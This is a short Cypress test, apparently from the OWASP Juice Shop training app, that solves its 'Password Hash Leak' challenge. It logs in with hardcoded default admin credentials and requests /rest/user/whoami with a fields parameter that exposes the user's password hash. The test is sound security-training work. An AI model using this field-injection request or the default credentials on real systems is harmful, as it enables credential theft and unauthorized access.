describe('challenge "Password Hash Leak"', () => {
  beforeEach(() => {
    cy.login({ email: 'admin@juice-sh.op', password: 'admin123' })
  })

  it('should solve the challenge by leaking the password hash via fields parameter', () => {
    cy.request({
      method: 'GET',
      url: '/rest/user/whoami?fields=id,email,password',
      headers: {
        // Cypress automatically handles cookies after cy.login
      }
    }).then((res) => {
      expect(res.body.user.password).to.be.a('string')
      expect(res.body.user.password.length).to.be.greaterThan(0)
      cy.expectChallengeSolved({ challenge: 'Password Hash Leak' })
    })
  })
})
